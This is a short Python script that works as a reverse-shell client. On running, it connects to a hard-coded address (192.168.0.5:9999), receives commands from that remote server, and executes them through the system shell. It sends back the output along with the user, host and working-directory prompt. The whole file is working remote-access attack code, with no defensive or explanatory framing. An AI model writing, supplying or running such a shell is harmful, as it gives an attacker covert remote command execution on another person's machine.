import os
import socket
import subprocess
import getpass
import platform
import os

# Create a socket
def socket_create():
    try:
        global host
        global port
        global s
        host = '192.168.0.5'
        port = 9999
        s = socket.socket()
    except socket.error as msg:
        print("Socket creation error: " + str(msg))


# Connect to a remote socket
def socket_connect():
    try:
        global host
        global port
        global s
        s.connect((host, port))
    except socket.error as msg:
        print("Socket connection error: " + str(msg))


# Receive commands from remote server and run on local machine
def receive_commands():
    global s
    while True:
        data = s.recv(1024)
        if data[:2].decode("utf-8") == 'cd':
            os.chdir(data[3:].decode("utf-8"))
        if len(data) > 0:
            cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            output_bytes = cmd.stdout.read() + cmd.stderr.read()
            output_str = str(output_bytes, "utf-8")
            s.send(str.encode(output_str + str(getpass.getuser() +'@'+ platform.node()+':'+os.getcwd()) + '> '))
            print(output_str)
    s.close()


def main():
    socket_create()
    socket_connect()
    receive_commands()


main()
